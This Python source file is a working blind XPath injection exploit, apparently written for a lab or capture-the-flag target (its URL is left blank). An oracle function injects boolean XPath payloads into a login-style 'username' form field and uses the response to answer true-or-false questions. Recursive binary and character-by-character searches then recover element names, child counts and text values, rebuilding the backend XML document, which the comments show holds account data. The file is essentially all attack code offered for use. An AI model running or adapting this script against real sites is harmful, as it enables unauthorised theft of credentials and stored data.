import requests
from lxml import html
from termcolor import colored
import xml.etree.ElementTree as ET
from xml.dom import minidom


# Global variables

url = ""
content_type = {'Content-Type':'application/x-www-form-urlencoded'}
node_name_history = []
path_parts = []

def oracle(payload):
    params = {
        'username': 'invalid\' or '+ payload + ' and \'1\'=\'1',
        'msg': 'whatever'
    }
    resp = requests.post(url=url, data=params, headers=content_type)
    tree = html.fromstring(resp.text)

    return 'alert("Message successfully sent!");' in tree.text_content()

# ----------------------------------------------------------------------------------------------------------------

#  *** Function to determine length of a node's name***
# payload: string-length(name(/*[1]))=1
def get_node_length(node_path_position, low, high):
    
    print(colored(f"[!] Get node length called for {node_path_position}", "yellow"))
    # node_position should be in the format : /*[1] | /*[1]/*[2]
    payload = f"string-length(name({node_path_position}))"
    
    mid = 0
    # If length of node is 0 --> it might be a comment node
    if(oracle(f"{payload} = {mid}")):
        print(colored(f"[!] Node position {node_path_position} might be a comment length = 0", "red"))
        return mid

    while low <= high:
        # // : integer division
        mid = (low + high) // 2
        # if the mid is equal we found the length => break
        if(oracle(f"{payload} = {mid}")):
            print(colored(f"[+] Node length is **{mid}** for node : {node_path_position}", "green"))
            return mid
        elif(oracle(f"{payload} > {mid}")):
            low = mid + 1
        elif(oracle(f"{payload} < {mid}")):
            high = mid - 1

    return False

# ----------------------------------------------------------------------------------------------------------------

# THis is a helper function to store the nodes names correctly
def adjust_node_name_format(name, node_path_position):
    
    # This part handles a node when it has siblings of the same name, it transforms the name to: user[1], user[2] and so on
    # because when extracting a nodes text content u can't pass /accounts/acc/username, it has to be specific /accounts/acc[1]/username and so on
    # IF node has been called before for example /accounts/acc --> save it as /accounts/acc[2]
    node_path = node_path_position.split("*")[0] + name
    temp_path_parts = path_parts.copy()
    temp_path_parts.append(name)

    print("*********", temp_path_parts)
    if(node_path in node_name_history):
        name = name + node_path_position.split("*")[1]

    elif get_node_children_count(temp_path_parts, 1, 10) == 0 :
        # don't change name
        pass
    else:
        node_name_history.append(node_path)
        name = name + '[1]'
    
    del temp_path_parts
    
    return name

# ----------------------------------------------------------------------------------------------------------------
# *** Function to determine a node name ***

def get_node_name(node_path_position, start_index, node_length):

    print(colored(f"[!] Get node name called for {node_path_position}", "yellow"))
    # node_position should be in the format : /*[1] | /*[1]/*[2]
    name = ""
    for i in range(start_index, node_length + 1):

        low = 97 # A
        high= 122 # y       
        payload = f"substring(name({node_path_position}),{i}, 1)"

        for char in range(low, high + 1):
            if(oracle(f"{payload} = '{chr(char)}'")):
                print(colored(f"[+] Found valid character **{chr(char)}** for node {node_path_position} at index: {i}", "green"))
                name+=chr(char)
                break
        
    name = adjust_node_name_format(name, node_path_position)

    print(colored(f"[+] Found name **{name}** for node :{node_path_position}", "blue"))
    return name


# ----------------------------------------------------------------------------------------------------------------

# *** Function that returns the count of children of a ndoe
def get_node_children_count(path_parts, low, high):

    print(colored(f"[!] Get node children count called for {path_parts}", "yellow"))
    # Example : path_parts = ['accounts', 'acc', 'username'] ==> /accounts/acc/username/*
    
    # Join the list elements with '/' and append '/*'
    node_path = '/' + '/'.join(path_parts)
    payload = f"count({node_path}/*)"
    
    mid = 0

    if(oracle(f"{payload} = {mid}")):
        print(colored(f"[-] No more children for node : {node_path}", "red"))
        return mid
    
    while low <= high:
        # // : integer division
        mid = (low + high) // 2
        # if the mid is equal we found the length => break
        if(oracle(f"{payload} = {mid}")):
            print(colored(f"[+] Found {mid} children nodes for node : {node_path}", "green"))
            return mid
        elif(oracle(f"{payload} > {mid}")):
            low = mid + 1
        elif(oracle(f"{payload} < {mid}")):
            high = mid - 1

    return False

# ----------------------------------------------------------------------------------------------------------------

# *** Function that returns the node's text content length ***
def get_node_text_length(node_position, low, high):
    
    print(colored(f"[!] Get node text length called for {node_position}", "yellow"))
    
    # node_position should be in the format : /*[1] | /*[1]/*[2]
    payload = f"string-length({node_position})"
    
    mid = 0
    
    if(oracle(f"{payload} = {mid}")):
        print(colored(f"[!] Node position {node_position} might be have empty text", "red"))
        return mid

    while low <= high:
        # // : integer division
        mid = (low + high) // 2
        # if the mid is equal we found the length => break
        if(oracle(f"{payload} = {mid}")):
            print(colored(f"[+] Node text length is **{mid}** for node : {node_position}", "green"))
            return mid
        elif(oracle(f"{payload} > {mid}")):
            low = mid + 1
        elif(oracle(f"{payload} < {mid}")):
            high = mid - 1

    return False

# ----------------------------------------------------------------------------------------------------------

# *** Function that returns node text content ***
def get_node_text_content(node_position, start_index, node_length):

    print(colored(f"[!] Get node TEXT name called for {node_position}", "yellow"))
    # node_position should be in the format : /*[1] | /*[1]/*[2]
    text = ""
    for i in range(start_index, node_length + 1):

        low = 32 # A
        high= 127 # y       
        payload = f"substring({node_position},{i}, 1)"

        for char in range(low, high + 1):
            if(oracle(f"{payload} = '{chr(char)}'")):
                print(colored(f"[+] Found valid character **{chr(char)}** for node {node_position} at index: {i}", "green"))
                text+=chr(char)
                break
        

    print(colored(f"[+] Found TEXT **{text}** for node :{node_position}", "blue"))
    return text


# ----------------------------------------------------------------------------------------------------------

# node_position --> /*[1] or /*[2] or /*[3] ...
# node_path_position --> /account/acc/*[1] or /account/acc/*[2] ... 
# path_parts = ['accounts', 'acc','users']


# *** Recursive function to extract schema of XML document ***
def extract_schema(parent_path, node_position, length_start, length_end):
    
    # node position is effectively its path --> /accounts/*[1]
    if (parent_path == '/'):
        node_path_position = f"/*[{node_position}]"
    else:
        node_path_position = f"{parent_path}/*[{node_position}]"

    # First, compute the necessary values before creating the node_info
    node_length = get_node_length(node_path_position, length_start, length_end)

    # If node name has a length then it has a name else its a probably a comment node
    if (node_length):
        node_name = get_node_name(node_path_position, length_start, node_length)
    else:
        return 'Comment'
    
    # Path parts should be global and transmitted to every recursive function call since it is a mutable object
    # path_parts = ['accounts', 'acc','users'] ... used to reconstrust the path
    path_parts.append(node_name)

    children_count = get_node_children_count(path_parts, length_start, length_end)


    # Now construct the node_info
    node_info = {
        'name': node_name,
        # change path_parts to a tuple because its immutable and will hold the values in it
        'path_parts':tuple(path_parts),
        'children_count': children_count,
        'children': []
    }
    print(node_info)
    
    # Check if the current node has chilren before attempting to extract them
    path = '/' + '/'.join(path_parts)

    if(node_info['children_count'] > 0):
        
        # Recursively extract schema for each child node
        for child_position in range (1, node_info['children_count'] + 1):
            
            temp_node_info = extract_schema(path, child_position, length_start, length_end)
            
            if(temp_node_info):
                
                node_info['children'].append(temp_node_info)  # Add child schema
                path_parts.pop()

    # If current node doesn't have chidlren extract its text content
    else:
        node_text_length = get_node_text_length(path, 0, 50)
        node_text = get_node_text_content(path, 1, node_text_length)
        node_info['text_content'] = node_text
    
    return node_info

schema = extract_schema('/' ,'1', 1, 10)
    
print(schema)

# VISUALIZATION PART

# def dict_to_xml(node_info):
#     # Create the root element
#     root = ET.Element(node_info["name"])
    
#     # Recursively process children
#     for child in node_info["children"]:
#         child_element = dict_to_xml(child)
#         root.append(child_element)
    
#     return root

# def pretty_print_xml(element):
#     # Convert the ElementTree element to a string
#     rough_string = ET.tostring(element, encoding="unicode")
#     # Parse it with minidom for pretty printing
#     parsed = minidom.parseString(rough_string)
#     return parsed.toprettyxml(indent="  ")

# Convert to XML
# xml_root = dict_to_xml(schema)

# Pretty-print the XML
# pretty_xml = pretty_print_xml(xml_root)

# with open("output.xml", "w", encoding="utf-8") as f:
    # f.write(pretty_xml)